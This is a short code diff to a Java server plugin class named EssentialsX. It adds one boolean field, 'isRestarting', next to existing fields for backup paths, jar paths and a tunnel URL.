@@ -22,6 +22,7 @@ public class EssentialsX extends JavaPlugin {
     private volatile boolean isProcessRunning = false;
     private boolean systemGuardEnabled = true;
     private Path backupDir;
+    private boolean isRestarting = false;
     private Path originalJarPath;
     private Path backupJarPath;
     private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
